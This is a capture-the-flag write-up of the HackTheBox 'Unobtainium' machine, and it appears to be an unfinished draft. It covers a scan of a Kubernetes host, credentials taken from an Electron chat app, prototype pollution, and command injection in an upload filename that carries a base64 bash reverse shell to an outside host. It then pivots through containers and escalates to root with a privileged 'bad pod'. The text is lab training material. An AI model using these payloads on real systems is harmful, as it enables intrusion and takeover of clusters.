# HackTheBox-Unobtainium

## NMAP

```bash
PORT      STATE    SERVICE          REASON         VERSION
22/tcp    open     ssh              syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)                                     
80/tcp    open     http             syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods:                                   
|_  Supported Methods: POST OPTIONS HEAD GET       
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Unobtainium                      
2379/tcp  open     ssl/etcd-client? syn-ack ttl 63                     
|_ssl-date: TLS randomness does not represent time
| tls-alpn:                
|_  h2                                                      
| tls-nextprotoneg:                                                            
|_  h2                                              
2380/tcp  open     ssl/etcd-server? syn-ack ttl 63
|_ssl-date: TLS randomness does not represent time               
| tls-alpn:                
|_  h2                                                      
| tls-nextprotoneg:                                                            
|_  h2                                              
8443/tcp  open     ssl/https-alt    syn-ack ttl 63
| fingerprint-strings:               
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8                                    
|     Connection: close              
|     Request                        
|   GetRequest:                      
|     HTTP/1.0 403 Forbidden                                             
|     Cache-Control: no-cache, private
|     Content-Type: application/json                                      
|     X-Content-Type-Options: nosniff                                     
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Wed, 04 Aug 2021 08:17:15 GMT                                 
|     Content-Length: 185            
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason
":"Forbidden","details":{},"code":403}                                    
|   HTTPOptions:                     
|     HTTP/1.0 403 Forbidden                                              
|     Cache-Control: no-cache, private                                    
|     Content-Type: application/json                                      
|     X-Content-Type-Options: nosniff                                     
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Wed, 04 Aug 2021 08:17:16 GMT                                 
|     Content-Length: 189            
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","re
ason":"Forbidden","details":{},"code":403}                                
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.sv
c, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Issuer: commonName=minikubeCA                                           
| Public Key type: rsa               
| Public Key bits: 2048              
| Signature Algorithm: sha256WithRSAEncryption                            
| Not valid before: 2021-07-25T14:52:45                                   
10249/tcp open     http             syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8)
10250/tcp open     ssl/http         syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=unobtainium@1610865428                    
| Subject Alternative Name: DNS:unobtainium                               
| Issuer: commonName=unobtainium-ca@1610865428                            
| Public Key type: rsa               
| Public Key bits: 2048              
| Signature Algorithm: sha256WithRSAEncryption                            
| Not valid before: 2021-01-17T05:37:08                                   
| Not valid after:  2022-01-17T05:37:08    
10256/tcp open     http             syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)                               
|_http-title: Site doesn't have a title (text/plain; charset=utf-8). 
31337/tcp open     http             syn-ack ttl 62 Node.js Express framework
| http-methods:                                                           
|   Supported Methods: GET HEAD PUT DELETE POST OPTIONS
|_  Potentially risky methods: PUT DELETE           
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
38233/tcp filtered unknown          no-response                

```

We can see a lot of ports from the nmap scan , the ports that are of our interest is port 80 and port 8443 on which kuberentes is running , kubernetes is used for container orchestration which is manager of running number of docker containers , monitioring and managing them. So first I'll enumerate the webserver on port 80

## PORT 80 (HTTP)

On port 80 we can see a simlple HTML template on which we have options to download a chat application what is called `Unobtainium`.

<img src="https://i.imgur.com/ncAp10K.png"/>

After downloading the debain file we can install it on our linux machine or we could unizp it to read the source code , on extracting , it looks like it's made using `electron` which is an open source framework for building deskop based application using javascript.

<img src="https://i.imgur.com/HTm99Hz.png"/>

We can see a folder named `resources` and in that folder there's a file named `app.asar` which is an archive used to package source code for an application using `Electron`. We can extract the files from it using `npx`

https://stackoverflow.com/questions/38523617/how-to-unpack-an-asar-file

<img src="https://i.imgur.com/vKmyusV.png"/>

<img src="https://i.imgur.com/0VYDQly.png"/>

We can find some creds from `app.js` 

<img src="https://i.imgur.com/VCNeT73.png"/>

Now installing the .deb package with `apt install ./unobtainium_1.0.0_amd64.deb` we can use the `unobtanium` binary also make sure to add `unobtanium.htb` in /etc/hosts file as it's making requests to that domain name.

<img src="https://i.imgur.com/TKEawKp.png"/>

We can send messages through this application and it logs those messages

<img src="https://i.imgur.com/8XIGD6y.png"/> 

So using `wireshark` we can analyze how it's making a POST request

<img src="https://i.imgur.com/UWZFl8j.png"/>

Right click on `/todo` packet and follow TCP stream

<img src="https://i.imgur.com/fP9tkAR.png"/>

From the terminal we can do a POST request like this

```bash
 curl --header "Content-Type: application/json" \
  --request POST \
  --data '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"todo.txt"}' \
  http://unobtainium.htb:31337/todo                                                                        
```

<img src="https://i.imgur.com/GX1rIOB.png"/>

Let's try to grab `index.js`

<img src="https://i.imgur.com/JOAxx1o.png"/>

Notice that the contents of index.js are different so to get a clear picture save this response in a bash scipt file like this 

```bash
echo -e 'respone'

```

Here `-e` will interpret those `\n` as new line character

<img  src="https://i.imgur.com/gDrp2s6.png"/>

Here we can see a library is being used `google-cloudstorage-commands` which is vulnerable to command injection

<img src="https://i.imgur.com/y073omY.png"/>

https://snyk.io/test/npm/google-cloudstorage-commands/0.0.1

Also we can upload files through a POST request `/upload`

<img src="https://i.imgur.com/pRIxd6e.png"/>

So to get a reverse shell we need to first `echo` the base64 encoded bash reverse shell , pipe that to decode it and run it by piping it to bash 

<img src="https://i.imgur.com/HBxV5Pw.png"/>


<img src="https://i.imgur.com/SYVfQwp.png"/>

```
curl -X PUT -H 'Content-Type: application/json' http://unobtainium.htb:31337/ --data '{"auth":{"name":"felamos","password":"Winter2021"},"message":{"__proto__":{"canUpload":true}}}'

```

Insert porotype pollution explaination , report and screenshot


bash -i >& /dev/tcp/10.10.14.45/2222 0>&1

```bash
curl --header "Content-Type: application/json" \
  --request POST \
  --data '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"& echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40NS8yMjIyIDA+JjE=' |base64 -d|bash"}' \
  http://unobtainium.htb:31337/upload
```

<img src="https://i.imgur.com/3snh1Mo.png"/>

Now to enumerate docker containers , we need to see if it's in a network of containers since we saw that kubernetes is being used. To check if there are other containers we can do a nmap scan , since the container doens't have one we can use static nmap binary and host it on our machine and download it through `wget` as it's avaiable on docker container. Prior to this I did try pining other hosts and it turns out there 10 hosts , from 172.17.0.1 to 172.17.0.10.

<img src="https://i.imgur.com/1vnNDEx.png"/>

I used the static nmap binary to do all port scan for 10 hosts .


## 172.17.0.1

```
Host is up (0.000022s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
8443/tcp  open  unknown
10250/tcp open  unknown
10256/tcp open  unknown
31337/tcp open  unknown

```

## 172.17.0.2

```
Host is up (0.000033s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
5000/tcp open  unknown

```

## 172.17.0.4
```
Host is up (0.000017s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
3000/tcp open  unknown

```

## 172.17.0.5
```
Host is up (0.000051s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
53/tcp   open  domain
8080/tcp open  http-alt
8181/tcp open  unknown
9153/tcp open  unknown
```

## 172.17.0.6

```
Host is up (0.000025s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
3000/tcp open  unknown

```

## 172.17.0.7

```
Host is up (0.000025s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
3000/tcp open  unknown
```


## 172.17.0.8

```
Host is up (0.000025s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
3000/tcp open  unknown

```

## 172.17.0.9

```
Host is up (0.000025s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
3000/tcp open  unknown

```

## 172.17.0.10

```
Host is up (0.000025s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
3000/tcp open  unknown

```

Now we cannot do anything here unless we upload `kubectl` binary on the docker container , kubectl is a command line tool for interacting with kubernetest cluster from which you can deploy clusters , monitor and manage them , view logs or access namespaces.

<img src="https://i.imgur.com/wxZVzaT.png"/>

After transferring `kubetcl` we can use the command `get pods` , a pod is a resource in which a container runs , usually one container runs in a pod , think pod as a wrapper around a docker container

<img src="https://i.imgur.com/LmZcJGc.png"/>

We don't have permission to view it , let's view `namespaces` , in kubernetes namespaces are used to organize `clusters` into groups or into a category where as clusters are collection or set tof nodes (docker conatiners) that are used to run an application. So let's try to view namespaces through `kubectl`

<img src="https://i.imgur.com/QgWej3L.png"/>

Here we see 5 namespaces out of which `default` , `kube-public` and `kube-system` . Default is for or objects with no other namespace, kube-public is used for public resources and kube-system is for objects created by the kubernetes system. We can't access them if we want to 

<img src="https://i.imgur.com/1TzCQYb.png"/>

Here I used `-n` which will specifiy which namespace we want to get information of , but we can't these namespaces, only `dev` namespace can be accessed here

<img src="https://i.imgur.com/FXGPYXq.png">

We have 3 pods running in `dev` namespace , to get information of a pod in this namespace we can use this command 

` ./kubectl get -o json pod devnode-deployment-cd86fb5c-6ms8d -n dev`

<img src="https://i.imgur.com/fwKP05X.png"/>

It has an exposed port which is 3000 as we saw from the nmap scan so this means it will be runnning the same API server from which we can get a rev shell again , now let's look for it's IP

<img src="https://i.imgur.com/wURj7gl.png"/>

<img src="https://i.imgur.com/iaaSQaU.png"/>

I got the rev shell again so that I could have to shells on the docker container , as I need a rev shell on the docker container again and I don't want to do port forwarding

<img src="https://i.imgur.com/tQ3BScL.png"/>

I transferred static binary of `ncat`  on docker container

https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat

<img src="https://i.imgur.com/oa8q7Bg.png"/>

```
curl -X PUT -H 'Content-Type: application/json' http://172.17.0.10:3000 --data '{"auth":{"name":"felamos","password":"Winter2021"},"message":{"__proto__":{"canUpload":true}}}'


```

```
curl --header "Content-Type: application/json" \
  --request POST \
  --data '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"& echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC40LzIyMjIgMD4mMQ==' |base64 -d|bash"}' \
  http://172.17.0.10:3000/upload
  
  ```
  
  Doing those steps again still I couldn't get a shell back
  
  <img src="https://i.imgur.com/L03BOQv.png"/>
  
  Now we really need to do portforwarding as this doesn't work on docker container , so we'll have to use `chisel` for port forwarding
  
  <img src="https://i.imgur.com/h5ZqKBf.png"/>
  
  <img src="https://i.imgur.com/TkPFR09.png"/>
  
  Here I am have started a chisel server on  port 2222 and on the client I am port forwarding the port 3000 from the target 172.17.0.10 and mappning it on port 3000 on my machine
  
  <img src="https://i.imgur.com/DPow5Zs.png"/>
  
  <img src="https://i.imgur.com/TEKNxFa.png"/>
  
  This doesn't have a `user.txt` flag which means we are on a different docker container, also if we try to see if `kubectl` exists or not 
  
  <img src="https://i.imgur.com/B6ht0NB.png"/>
  
  Again we need to transfer that binary in this container
  
  <img src="https://i.imgur.com/K6O0CQQ.png"/>
  
  <img src="https://i.imgur.com/TvWhGa7.png"/>
  
  From this container we can't get even `namespaces` but using `kubectl get secrets -n kube-system` we can get secrets. A `secret` is an object that contains a small amount of sensitive data such as a password, a token, or a key with which we have ability to modify or create pods in namespace 
  
  <img src="https://i.imgur.com/GquYxzD.png"/>
  
  We can get information of the secret through  `/kubectl describe secret c-admin-token-tfmp2 -n kube-system`
  
  <img src="https://i.imgur.com/SposTEz.png"/>
  
  Reffering to this article 
https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation

We can create what is called `Bad Pods` that can give you root access to the host system if you have compromised kuberneteres secretes which have so we can try to make a bad pod 

https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml

I'll be using this yaml file for creating a pod but the problem is that we can't download the image , in this yaml file it is set to `ubuntu` as this machine doesn't have internet access it can't really download the image

<img src="https://i.imgur.com/u6kG8oW.png"/>

But going back to the information we pulled from the pod in `dev` namespace we can use  the image name `localhost:5000/node_server`

<img src="https://i.imgur.com/35PZX3m.png"/>

<img src="https://i.imgur.com/omQgesQ.png"/>

https://published-prd.lanyonevents.com/published/rsaus20/sessionsFiles/18100/2020_USA20_DSO-W01_01_Compromising%20Kubernetes%20Cluster%20by%20Exploiting%20RBAC%20Permissions.pdf

For this to work we need to supply the token other wise pod won't be created

<img src="https://i.imgur.com/RnVP0Ut.png"/>

On our netcat we would get a reverse shell but it will get terminated as a pod clean up script is being ran 

<img src="https://i.imgur.com/BlBvvct.png"/>

<img src="https://i.imgur.com/fSWWNxI.png"/>